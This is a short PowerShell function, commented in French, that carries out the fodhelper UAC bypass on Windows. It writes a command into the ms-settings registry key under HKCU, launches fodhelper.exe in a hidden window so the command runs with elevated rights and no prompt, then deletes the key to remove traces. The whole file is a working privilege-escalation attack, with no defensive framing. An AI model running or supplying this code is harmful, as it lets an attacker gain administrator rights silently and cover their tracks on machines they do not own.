function FodhelperBypass {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [string]$Command
    )

    # On ne met pas de guillemets autour du programme dans CMD
    $payload = "cmd.exe /c \"\" $Command"

    # Crée la clé de registre pour le bypass
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $payload -Force

    # Lance le bypass via fodhelper (élévation sans prompt)
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    Start-Sleep -Seconds 3

    # Nettoyage
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
}
